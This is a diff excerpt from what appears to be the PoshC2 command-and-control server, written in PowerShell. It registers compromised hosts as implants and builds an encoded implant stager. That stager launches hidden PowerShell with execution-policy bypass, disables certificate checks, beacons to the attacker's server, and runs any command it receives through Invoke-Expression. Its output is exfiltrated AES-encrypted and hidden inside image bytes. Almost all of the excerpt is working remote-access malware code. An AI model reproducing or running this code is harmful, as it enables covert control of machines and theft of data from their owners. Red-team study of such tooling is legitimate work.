         if ([System.IO.File]::Exists("$global:newdir/payloads/ms16-051.html")){
             $message = Get-Content -Path $global:newdir/payloads/ms16-051.html
@@ -880,7 +978,7 @@ while ($listener.IsListening)
         }
 
     }
-    if ($request.Url -match "/webapp/static/$($downloaduri)_rg$") 
+    if ($request.Url -match "$($downloadStubURL)$($downloaduri)_rg$") 
     {
         
         if ([System.IO.File]::Exists("$global:newdir/payloads/rg_sct.xml")){
@@ -890,7 +988,7 @@ while ($listener.IsListening)
         }
        
     }
-    if ($request.Url -match "/webapp/static/$($downloaduri)_cs$") 
+    if ($request.Url -match "$($downloadStubURL)$($downloaduri)_cs$") 
     {
 
         if ([System.IO.File]::Exists("$global:newdir/payloads/cs_sct.xml")){
@@ -900,7 +998,7 @@ while ($listener.IsListening)
         }
 
     }
-    if ($request.Url -match "/webapp/static/$($downloaduri)_js$") 
+    if ($request.Url -match "$($downloadStubURL)$($downloaduri)_js$") 
     {
 
         if ([System.IO.File]::Exists("$global:newdir/payloads/js_sct.xml")){
@@ -910,7 +1008,7 @@ while ($listener.IsListening)
         }
 
     }
-    if ($request.Url -match "/webapp/static/$($downloaduri)_df$") 
+    if ($request.Url -match "$($downloadStubURL)$($downloaduri)_df$") 
     {
 
         if ([System.IO.File]::Exists("$global:newdir/payloads/df_sct.xml")){
@@ -920,7 +1018,7 @@ while ($listener.IsListening)
         }
 
     }
-    if ($request.Url -match "/webapp/static/$($downloaduri)_iu$") 
+    if ($request.Url -match "$($downloadStubURL)$($downloaduri)_iu$") 
     {
 
         if ([System.IO.File]::Exists("$global:newdir/payloads/posh.exe")){
@@ -931,8 +1029,13 @@ while ($listener.IsListening)
         }
 
     }
-    if (($request.Url -match '/connect\?d') -and (($request.Cookies[0]).Name -match 'SessionID'))
-    {
+    if ((($request.Url -match "/$($newImplantURL)$") -or ($request.Url -match "/$($newImplantURL)\?p") -or ($request.Url -match "/$($newImplantURL)\?d")) -and (($request.Cookies[0]).Name -match 'SessionID')) 
+    { 
+
+        if ($request.Url -match "/$($newImplantURL)\?p") {$type = "Proxy"} 
+        if ($request.Url -match "/$($newImplantURL)\?d") {$type = "Daisy"} 
+        if ($request.Url -match "/$($newImplantURL)$") {$type = "Normal"}
+
         # generate randon uri
         $randomuri = Get-RandomURI -Length 15
         $randomuriarray += $randomuri
@@ -940,348 +1043,12 @@ while ($listener.IsListening)
         # create new key for each implant comms
         $key = Create-AesKey
         $endpointip = $request.RemoteEndPoint
-        $cookieplaintext = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(($request.Cookies[0]).Value))
-        $im_domain,$im_username,$im_computername,$im_arch,$im_pid,$im_proxy = $cookieplaintext.split(";",6)
-
-        ## add anti-ir and implant safety mechanisms here!
-        #
-        # if ($im_domain -ne "blorebank") { do something }
-        # if ($im_domain -ne "safenet") { do something }
-        #
-        ## add anti-ir and implant safety mechanisms here!
-
-        $im_firstseen = $(Get-Date)
-        Write-Host "New Daisy host connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
-        Write-Host "$endpointip | URL:$im_proxy | Time:$im_firstseen | PID:$im_pid | Sleep:$defaultbeacon | $im_computername $im_domain ($im_arch) "`n -ForegroundColor Green
-
-        # optional clockwork sms on new implant
-        if (($apikey) -and ($mobilenumber)){
-            (New-Object System.Net.Webclient).DownloadString("https://api.clockworksms.com/http/send.aspx?key=$($apikey)&to=$($mobilenumber)&from=PoshC2&content=NewImplant:$($im_domain)\$($im_computername)")|Out-Null
-        }
-
-        if ($enablesound -eq "Yes") {
-            try {
-            $voice = New-Object -com SAPI.SpVoice                        
-            $voice.rate = -2                        
-            $voice.Speak("Nice, we have a daisy chain implant")|Out-Null
-            } catch {}
-        }
-
-        $Query = 'INSERT INTO Implants (RandomURI, User, Hostname, IpAddress, Key, FirstSeen, LastSeen, PID, Proxy, Arch, Domain, Alive, Sleep, ModsLoaded, Pivot)
-        VALUES (@RandomURI, @User, @Hostname, @IpAddress, @Key, @FirstSeen, @LastSeen, @PID, @Proxy, @Arch, @Domain, @Alive, @Sleep, @ModsLoaded, @Pivot)'
-
-        Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
-            RandomURI = $randomuri
-            User      = $im_username
-            Hostname  = $im_computername
-            IpAddress = $request.RemoteEndPoint
-            Key       = $key
-            FirstSeen = "$(Get-Date)"
-            LastSeen  = "$(Get-Date)"
-            PID  = $im_pid
-            Proxy = $im_proxy
-            Arch = $im_arch
-            Domain = $im_domain
-            Alive = "Yes"
-            Sleep = $defaultbeacon
-            ModsLoaded = ""
-            Pivot = "Daisy"
-        }
-
-	    $autorunresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM AutoRuns" -As PSObject        
- 
-        if ($autorunresults -ne $null){
-			Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET ModsLoaded='implant-core.ps1' WHERE RandomURI='$randomuri'"|Out-Null
-			$query = "INSERT INTO NewTasks (RandomURI, Command)
-			VALUES (@RandomURI, @Command)"
-			
-			Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
-			RandomURI = $randomuri
-			Command   = "LoadModule implant-core.ps1"
-			} | Out-Null
-			
-            foreach ($i in $autorunresults) {
-                $taskee = $i.Task
-                			
-                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
-			    RandomURI = $randomuri
-			    Command   = $taskee
-                } | Out-Null
-			
-            }
-		}
-
-        $message = '
-
-$key="' + "$key"+'"
-$sleeptime = '+$defaultbeacon+'
-
-$payloadclear = @"
-`$username = "$proxyuser"
-`$password = "$proxypassword"
-`$proxyurl = "$proxyurl"
-`$domainfrontheader = "$domfront"
-`$serverport = "$serverport"
-`$Server = "$Server"
-`$Serverclean = "$Serverclean"
-[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
-function Get-Webclient {${function:Get-Webclient}} function Primer {${function:primer}}
-`$primer = primer
-if (`$primer) {`$primer| iex} else {
-start-sleep 10
-primer | iex }
-"@
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($payloadclear)
-$payloadraw = "powershell -exec bypass -Noninteractive -windowstyle hidden -e "+[Convert]::ToBase64String($bytes)
-$payload = $payloadraw -replace "`n", ""
-
-function getimgdata($cmdoutput) {
-    $icoimage = @("'+$imageArray[-1]+'","'+$imageArray[0]+'","'+$imageArray[1]+'","'+$imageArray[2]+'","'+$imageArray[3]+'")
-    $image = $icoimage|get-random
-
-    function randomgen 
-    {
-        param (
-            [int]$Length
-        )
-        $set = "...................@..........................Tyscf".ToCharArray()
-        $result = ""
-        for ($x = 0; $x -lt $Length; $x++) 
-        {$result += $set | Get-Random}
-        return $result
-    }
-    $imageBytes = [Convert]::FromBase64String($image)
-    $maxbyteslen = 1500
-    $imagebyteslen = $imageBytes.Length
-    $paddingbyteslen = $maxbyteslen - $imagebyteslen
-
-    $BytePadding = [system.Text.Encoding]::UTF8.GetBytes((randomgen $paddingbyteslen))
-    $ImagePlusPad = New-Object byte[] $maxbyteslen
-    $ImagePlusPadBytes = ($imageBytes+$BytePadding)
-    $CombinedBytes = $ImagePlusPadBytes.length
-
-    $CmdBytes = $cmdoutput
-    $CmdBytesLen = $CmdBytes.Length
-
-    $CombinedByteSize = $CmdBytesLen + $CombinedBytes
-    $FullBuffer = New-Object byte[] $CombinedByteSize
-
-    $FullBuffer = ($ImagePlusPadBytes+$CmdBytes)
-    $FullBufferSize = $FullBuffer.length
-    return $FullBuffer
-}
-
-function Create-AesManagedObject($key, $IV) {
-    $aesManaged = New-Object "System.Security.Cryptography.RijndaelManaged"
-    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
-    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
-    $aesManaged.BlockSize = 128
-    $aesManaged.KeySize = 256
-    if ($IV) {
-    if ($IV.getType().Name -eq "String") {
-    $aesManaged.IV = [System.Convert]::FromBase64String($IV)
-    }
-    else {
-    $aesManaged.IV = $IV
-    }
-    }
-    if ($key) {
-    if ($key.getType().Name -eq "String") {
-    $aesManaged.Key = [System.Convert]::FromBase64String($key)
-    }
-    else {
-    $aesManaged.Key = $key
-    }
-    }
-    $aesManaged
-}
-
-function Encrypt-String($key, $unencryptedString) {
-    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
-    $aesManaged = Create-AesManagedObject $key
-    $encryptor = $aesManaged.CreateEncryptor()
-    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
-    [byte[]] $fullData = $aesManaged.IV + $encryptedData
-    #$aesManaged.Dispose()
-    [System.Convert]::ToBase64String($fullData)
-}
-
-function Decrypt-String($key, $encryptedStringWithIV) {
-    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
-    $IV = $bytes[0..15]
-    $aesManaged = Create-AesManagedObject $key $IV
-    $decryptor = $aesManaged.CreateDecryptor();
-    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
-    #$aesManaged.Dispose()
-    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
-}
-function Encrypt-String2($key, $unencryptedString) {
-    $unencryptedBytes = [system.Text.Encoding]::UTF8.GetBytes($unencryptedString)
-    $CompressedStream = New-Object IO.MemoryStream
-    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
-    $DeflateStream.Write($unencryptedBytes, 0, $unencryptedBytes.Length)
-    $DeflateStream.Dispose()
-    $bytes = $CompressedStream.ToArray()
-    $CompressedStream.Dispose()
-    $aesManaged = Create-AesManagedObject $key
-    $encryptor = $aesManaged.CreateEncryptor()
-    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
-    [byte[]] $fullData = $aesManaged.IV + $encryptedData
-    $fullData
-}
-function Decrypt-String2($key, $encryptedStringWithIV) {
-    $bytes = $encryptedStringWithIV
-    $IV = $bytes[0..15]
-    $aesManaged = Create-AesManagedObject $key $IV
-    $decryptor = $aesManaged.CreateDecryptor()
-    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
-    $output = (New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$unencryptedData)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()
-    $output
-    #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
-}
-[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-$URI= "'+$randomuri+'"
-$ServerClean = $Server
-$Server = "$server/'+$randomuri+'"
-
-while($true)
-{
-    $date = (Get-Date -Format "dd/MM/yyyy")
-    $date = [datetime]::ParseExact($date,"dd/MM/yyyy",$null)
-    $killdate = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null)
-    if ($killdate -lt $date) {exit}
-    $sleeptimeran = $sleeptime, ($sleeptime * 1.1), ($sleeptime * 0.9)
-    $newsleep = $sleeptimeran|get-random
-    if ($newsleep -lt 1) {$newsleep = 5} 
-    start-sleep $newsleep
-    $URLS = '+$urlstring+'
-    $RandomURI = Get-Random $URLS
-    $Server = "$ServerClean/$RandomURI$URI"
-    try { $ReadCommand = (Get-Webclient).DownloadString("$Server") } catch {}
-
-     while($ReadCommand) {
-        $ReadCommandClear = Decrypt-String $key $ReadCommand
-        $error.clear()
-        if (($ReadCommandClear) -and ($ReadCommandClear -ne "fvdsghfdsyyh")) {
-            if  ($ReadCommandClear.ToLower().StartsWith("multicmd")) {
-                    $splitcmd = $ReadCommandClear -replace "multicmd",""
-                    $split = $splitcmd -split "!d-3dion@LD!-d"
-                    foreach ($i in $split){
-                        $error.clear()
-                        if  ($i.ToLower().StartsWith("upload-file")) {
-                            try {
-                                $Output = Invoke-Expression $i | out-string
-                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
-                                if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
-                                $ModuleLoaded = Encrypt-String $key $result
-                                $Output = Encrypt-String2 $key $Output
-                                $UploadBytes = getimgdata $Output
-                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
-                            } catch {
-                                $Output = "ErrorUpload: " + $error[0]
-                            }
-                        } elseif  ($i.ToLower().StartsWith("loadmodule")) {
-                            try {
-                                $modulename = $i -replace "LoadModule",""
-                                $Output = Invoke-Expression $modulename | out-string  
-                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
-                                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
-                                $Output = Encrypt-String2 $key $Output
-                                $UploadBytes = getimgdata $Output
-                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
-                            } catch {
-                                $Output = "ErrorLoadMod: " + $error[0]
-                            }
-                        } else {
-                            try {
-                                $Output = Invoke-Expression $i | out-string  
-                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
-                                $StdError = ($error[0] | Out-String)
-                                if ($StdError){
-                                $Output = $Output + $StdError
-                                $error.clear()
-                                }
-                            } catch {
-                                $Output = "ErrorCmd: " + $error[0]
-                            }
-                            $Output = Encrypt-String2 $key $Output
-                            $Response = Encrypt-String $key $i
-                            $UploadBytes = getimgdata $Output
-                            (Get-Webclient -Cookie $Response).UploadData("$Server", $UploadBytes)|out-null
-                        }
-                    } 
-            }
-            elseif  ($ReadCommandClear.ToLower().StartsWith("upload-file")) {
-                try {
-                $Output = Invoke-Expression $ReadCommandClear | out-string
-                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
-                if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
-                $ModuleLoaded = Encrypt-String $key $result
-                $Output = Encrypt-String2 $key $Output
-                $UploadBytes = getimgdata $Output
-                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
-                } catch {
-                    $Output = "ErrorUpload: " + $error[0]
-                }
-
-            } elseif  ($ReadCommandClear.ToLower().StartsWith("loadmodule")) {
-                try {
-                $modulename = $ReadCommandClear -replace "LoadModule",""
-                $Output = Invoke-Expression $modulename | out-string  
-                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
-                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
-                $Output = Encrypt-String2 $key $Output
-                $UploadBytes = getimgdata $Output
-                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
-                } catch {
-                    $Output = "ErrorLoadMod: " + $error[0]
-                }
-
-            } else {
-                try {
-                    $Output = Invoke-Expression $ReadCommandClear | out-string  
-                    $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
-                    $StdError = ($error[0] | Out-String)
-                    if ($StdError){
-                    $Output = $Output + $StdError
-                    $error.clear()
-                    }
-                } catch {
-                    $Output = "ErrorCmd: " + $error[0]
-                }
-
-            $Output = Encrypt-String2 $key $Output
-            $UploadBytes = getimgdata $Output
-            (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
-
-            }
-        }
-    break
-    }
-}'
-
-$Bytes = [System.Text.Encoding]::Unicode.GetBytes($message)
-$message =[Convert]::ToBase64String($Bytes)
-
-    }
-    if ((($request.Url -match '/connect$') -or ($request.Url -match '/connect\?p')) -and (($request.Cookies[0]).Name -match 'SessionID')) 
-    {
+        $cookieplaintext = Decrypt-String -key $EncKey -encryptedStringWithIV ($request.Cookies[0]).Value
 
         
-        if ($request.Url -match '/connect\?p') {$type = "Proxy"} 
-        if ($request.Url -match '/connect$') {$type = "Normal"}
-
-        # generate randon uri
-        $randomuri = Get-RandomURI -Length 15
-        $randomuriarray += $randomuri
-
-        # create new key for each implant comms
-        $key = Create-AesKey
-        $endpointip = $request.RemoteEndPoint
-
-        $cookieplaintext = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(($request.Cookies[0]).Value))
-
         $im_domain,$im_username,$im_computername,$im_arch,$im_pid,$im_proxy = $cookieplaintext.split(";",6)
+
+        if($im_pid -gt 0){       
 
         $c2serverresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
         $defaultbeacon = $c2serverresults.DefaultSleep
@@ -1293,11 +1060,29 @@ $message =[Convert]::ToBase64String($Bytes)
         #
         ## add anti-ir and implant safety mechanisms here!
         $im_firstseen = $(Get-Date)
-        if ($request.Url -match '/connect\?p') {
-            Write-Host "New Proxy host connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
+        if ($request.Url -match "/$($newImplantURL)\?p") {
+            Write-Host "New Proxy implant connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
+$connectvars = '
+$URI= "'+$randomuri+'"
+$Server = "$s'+'/'+$randomuri+'"
+$ServerClean = "$sc"
+'
+        } elseif ($request.Url -match "/$($newImplantURL)\?d") {
+            Write-Host "New Daisy implant connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
+$connectvars = '
+$URI= "'+$randomuri+'"
+$Server = "$s'+'/'+$randomuri+'"
+$ServerClean = "$sc"
+'
         } else {
-            Write-Host "New host connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
+            Write-Host "New Direct implant connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
+$connectvars = '
+$URI= "'+$randomuri+'"
+$Server = "$s'+'/'+$randomuri+'"
+$ServerClean = "$sc"
+'
         }
+
         Write-Host "$endpointip | URL:$im_proxy | Time:$im_firstseen | PID:$im_pid | Sleep:$defaultbeacon | $im_computername $im_domain ($im_arch) "`n -ForegroundColor Green
 
         # optional clockwork sms on new implant
@@ -1313,8 +1098,8 @@ $message =[Convert]::ToBase64String($Bytes)
             } catch {}
         }
 
-        $Query = 'INSERT INTO Implants (RandomURI, User, Hostname, IpAddress, Key, FirstSeen, LastSeen, PID, Arch, Domain, Alive, Sleep, ModsLoaded, Pivot)
-        VALUES (@RandomURI, @User, @Hostname, @IpAddress, @Key, @FirstSeen, @LastSeen, @PID, @Arch, @Domain, @Alive, @Sleep, @ModsLoaded, @Pivot)'
+        $Query = 'INSERT INTO Implants (RandomURI, User, Hostname, IpAddress, Key, FirstSeen, LastSeen, PID, Proxy, Arch, Domain, Alive, Sleep, ModsLoaded, Pivot)
+        VALUES (@RandomURI, @User, @Hostname, @IpAddress, @Key, @FirstSeen, @LastSeen, @PID, @Proxy, @Arch, @Domain, @Alive, @Sleep, @ModsLoaded, @Pivot)'
 
         Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
             RandomURI = $randomuri
@@ -1325,6 +1110,7 @@ $message =[Convert]::ToBase64String($Bytes)
             FirstSeen = $im_firstseen
             LastSeen  = "$(Get-Date)"
             PID  = $im_pid
+            Proxy  = $im_proxy
             Arch = $im_arch
             Domain = $im_domain
             Alive = "Yes"
@@ -1363,17 +1149,34 @@ $sleeptime = '+$defaultbeacon+'
 
 $payloadclear = @"
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
-function Get-Webclient {${function:Get-Webclient}} function Primer {${function:primer}}
+`$s="$s"
+`$sc="$sc"
+function DEC {${function:DEC}}
+function ENC {${function:ENC}}
+function CAM {${function:CAM}}
+function Get-Webclient {${function:Get-Webclient}} 
+function Primer {${function:primer}}
 `$primer = primer
 if (`$primer) {`$primer| iex} else {
-start-sleep 10
+start-sleep 1800
 primer | iex }
 "@
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($payloadclear)
-$payloadraw = "powershell -exec bypass -Noninteractive -windowstyle hidden -e "+[Convert]::ToBase64String($bytes)
+
+$ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($payloadclear)
+$CompressedStream = New-Object IO.MemoryStream
+$DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
+$DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
+$DeflateStream.Dispose()
+$CompressedScriptBytes = $CompressedStream.ToArray()
+$CompressedStream.Dispose()
+$EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
+$NewScript = "sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(`"$EncodedCompressedScript`"),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"
+$UnicodeEncoder = New-Object System.Text.UnicodeEncoding
+$EncodedPayloadScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($NewScript))
+$payloadraw = "powershell -exec bypass -Noninteractive -windowstyle hidden -e $($EncodedPayloadScript)"
 $payload = $payloadraw -replace "`n", ""
 
-function getimgdata($cmdoutput) {
+function GetImgData($cmdoutput) {
     $icoimage = @("'+$imageArray[-1]+'","'+$imageArray[0]+'","'+$imageArray[1]+'","'+$imageArray[2]+'","'+$imageArray[3]+'")
     
     try {$image = $icoimage|get-random}catch{}
@@ -1391,25 +1194,16 @@ function getimgdata($cmdoutput) {
     }
     $imageBytes = [Convert]::FromBase64String($image)
     $maxbyteslen = 1500
+    $maxdatalen = 1500 + ($cmdoutput.Length)
     $imagebyteslen = $imageBytes.Length
     $paddingbyteslen = $maxbyteslen - $imagebyteslen
-
-    $BytePadding = [system.Text.Encoding]::UTF8.GetBytes((randomgen $paddingbyteslen))
-    $ImagePlusPad = New-Object byte[] $maxbyteslen
-    $ImagePlusPadBytes = ($imageBytes+$BytePadding)
-    $CombinedBytes = $ImagePlusPadBytes.length
-
-    $CmdBytes = $cmdoutput
-    $CmdBytesLen = $CmdBytes.Length
-
-    $CombinedByteSize = $CmdBytesLen + $CombinedBytes
-    $FullBuffer = New-Object byte[] $CombinedByteSize
-
-    $FullBuffer = ($ImagePlusPadBytes+$CmdBytes)
-    $FullBufferSize = $FullBuffer.length
-    return $FullBuffer
+    $BytePadding = [System.Text.Encoding]::UTF8.GetBytes((randomgen $paddingbyteslen))
+    $ImageBytesFull = New-Object byte[] $maxdatalen    
+    [System.Array]::Copy($imageBytes, 0, $ImageBytesFull, 0, $imageBytes.Length)
+    [System.Array]::Copy($BytePadding, 0, $ImageBytesFull,$imageBytes.Length, $BytePadding.Length)
+    [System.Array]::Copy($cmdoutput, 0, $ImageBytesFull,$imageBytes.Length+$BytePadding.Length, $cmdoutput.Length )
+    $ImageBytesFull
 }
-
 function Create-AesManagedObject($key, $IV) {
     $aesManaged = New-Object "System.Security.Cryptography.RijndaelManaged"
     $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
@@ -1444,7 +1238,19 @@ function Encrypt-String($key, $unencryptedString) {
     #$aesManaged.Dispose()
     [System.Convert]::ToBase64String($fullData)
 }
-
+function Encrypt-Bytes($key, $bytes) {
+	[System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
+	$gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
+	$gzipStream.Write( $bytes, 0, $bytes.Length )
+	$gzipStream.Close()
+	$bytes = $output.ToArray()
+	$output.Close()
+	$aesManaged = Create-AesManagedObject $key 
+    $encryptor = $aesManaged.CreateEncryptor() 
+    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
+    [byte[]] $fullData = $aesManaged.IV + $encryptedData 
+	$fullData
+}
 function Decrypt-String($key, $encryptedStringWithIV) {
     $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
     $IV = $bytes[0..15]
@@ -1457,7 +1263,7 @@ function Decrypt-String($key, $encryptedStringWithIV) {
 function Encrypt-String2($key, $unencryptedString) {
     $unencryptedBytes = [system.Text.Encoding]::UTF8.GetBytes($unencryptedString)
     $CompressedStream = New-Object IO.MemoryStream
-    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
+    $DeflateStream = New-Object System.IO.Compression.GzipStream $CompressedStream, ([IO.Compression.CompressionMode]::Compress)
     $DeflateStream.Write($unencryptedBytes, 0, $unencryptedBytes.Length)
     $DeflateStream.Dispose()
     $bytes = $CompressedStream.ToArray()
@@ -1479,9 +1285,8 @@ function Decrypt-String2($key, $encryptedStringWithIV) {
     #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
 }
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-$URI= "'+$randomuri+'"
-$Server = "'+$ipv4address+":"+$serverport+'/'+$randomuri+'"
-$ServerClean = "'+$ipv4address+":"+$serverport+'"
+
+'+$connectvars+'
 
 while($true)
 {
@@ -1495,19 +1300,26 @@ while($true)
     start-sleep $newsleep
     $URLS = '+$urlstring+'
     $RandomURI = Get-Random $URLS
-    $Server = "$ServerClean/$RandomURI$URI"
+    $G=[guid]::NewGuid()
+    $Server = "$ServerClean/$RandomURI$G/?$URI"
     try { $ReadCommand = (Get-Webclient).DownloadString("$Server") } catch {}
     
     while($ReadCommand) {
-        $ReadCommandClear = Decrypt-String $key $ReadCommand
+        $RandomURI = Get-Random $URLS
+        $G=[guid]::NewGuid()
+        $Server = "$ServerClean/$RandomURI$G/?$URI"
+        try { $ReadCommandClear = Decrypt-String $key $ReadCommand } catch {}
         $error.clear()
         if (($ReadCommandClear) -and ($ReadCommandClear -ne "fvdsghfdsyyh")) {
             if  ($ReadCommandClear.ToLower().StartsWith("multicmd")) {
                     $splitcmd = $ReadCommandClear -replace "multicmd",""
                     $split = $splitcmd -split "!d-3dion@LD!-d"
                     foreach ($i in $split){
+                        $RandomURI = Get-Random $URLS
+                        $G=[guid]::NewGuid()
+                        $Server = "$ServerClean/$RandomURI$G/?$URI"
                         $error.clear()
-                        if  ($i.ToLower().StartsWith("upload-file")) {
+                        if ($i.ToLower().StartsWith("upload-file")) {
                             try {
                                 $Output = Invoke-Expression $i | out-string
                                 $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
@@ -1519,7 +1331,14 @@ while($true)
                             } catch {
                                 $Output = "ErrorUpload: " + $error[0]
                             }
-                        } elseif  ($i.ToLower().StartsWith("loadmodule")) {
+                        } elseif ($i.ToLower().StartsWith("download-file")) {
+                            try {
+                                Invoke-Expression $i | Out-Null
+                            }
+                            catch {
+                                $Output = "ErrorLoadMod: " + $error[0]
+                            }
+                        } elseif ($i.ToLower().StartsWith("loadmodule")) {
                             try {
                                 $modulename = $i -replace "LoadModule",""
                                 $Output = Invoke-Expression $modulename | out-string  
@@ -1552,7 +1371,7 @@ while($true)
                         }
                     } 
             }
-            elseif  ($ReadCommandClear.ToLower().StartsWith("upload-file")) {
+            elseif ($ReadCommandClear.ToLower().StartsWith("upload-file")) {
                 try {
                 $Output = Invoke-Expression $ReadCommandClear | out-string
                 $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
@@ -1565,7 +1384,14 @@ while($true)
                     $Output = "ErrorUpload: " + $error[0]
                 }
 
-            } elseif  ($ReadCommandClear.ToLower().StartsWith("loadmodule")) {
+            } elseif ($ReadCommandClear.ToLower().StartsWith("download-file")) {
+                try {
+                    Invoke-Expression $ReadCommandClear | Out-Null
+                }
+                catch {
+                    $Output = "ErrorLoadMod: " + $error[0]
+                }
+            } elseif ($ReadCommandClear.ToLower().StartsWith("loadmodule")) {
                 try {
                 $modulename = $ReadCommandClear -replace "LoadModule",""
                 $Output = Invoke-Expression $modulename | out-string  
@@ -1596,14 +1422,15 @@ while($true)
             (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
             } catch {}
             }
+            $ReadCommandClear = $null
         }
     break
     }
 }'
-
-$Bytes = [System.Text.Encoding]::Unicode.GetBytes($message)
-$message =[Convert]::ToBase64String($Bytes)
-
+$message = Encrypt-String -key $EncKey -unencryptedString $message
+} else { 
+   #write-host "ERROR Decrypting new implant - could be replay attack"
+} 
     }
 
     $randomuriagents = Invoke-SqliteQuery -DataSource $Database -Query 'SELECT RandomURI FROM Implants' -As SingleValue
@@ -1615,6 +1442,9 @@ $message =[Convert]::ToBase64String($Bytes)
         $im_results = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants WHERE RandomURI='$ranuri'" -As PSObject
         $key = $im_results.Key
         $hostname = $im_results.Hostname
+        $implantID = $im_results.ImplantID
+        $imDom = $im_results.Domain
+
         $currenttime = (Get-Date)
         $multicmdresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM NewTasks WHERE RandomURI='$ranuri'" -As PSObject
         # send multi commands to the client 
@@ -1625,7 +1455,7 @@ $message =[Convert]::ToBase64String($Bytes)
                 $taskid = $i.Command
                 $taskidtime = $i.TaskID
                 if (!$taskid.ToLower().startswith('fvdsghfdsyyh')) {
-                    Write-Host "Command issued against host: $hostname" -ForegroundColor Yellow
+                    Write-Host "Command issued against implant $implantID on host $hostname $imDom" -ForegroundColor Yellow
                     if  ($taskid.ToLower().startswith('upload-file')) {
                         Write-Host -Object "Uploading File" -ForegroundColor Yellow
                     } elseif ($taskid.ToLower().startswith("`$shellcode")) {
@@ -1669,7 +1499,6 @@ $message =[Convert]::ToBase64String($Bytes)
                 }
                 Invoke-SqliteQuery -DataSource $Database -Query "DELETE FROM NewTasks WHERE RandomURI='$ranuri' and TaskID='$taskidtime'"|out-null
             }
-
             if ($multicmdresults.Count -gt 1){
                 $message = "multicmd" + $message
             }
@@ -1683,10 +1512,7 @@ $message =[Convert]::ToBase64String($Bytes)
         if (($request.Url -like "*$ranuri*") -and ($request.HttpMethod -eq 'GET') -and ($multicmdresults.Count -eq 0)) 
         { 
             Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET LastSeen='$(get-date)' WHERE RandomURI='$ranuri'"|out-null
-            $message = 'fvdsghfdsyyh'
-            $fromstring = Encrypt-String $key $message
-            $commandsent = $fromstring
-            $message = $fromstring
+            $message = " "
         } 
 
         # a completed command has returned to the c2 server
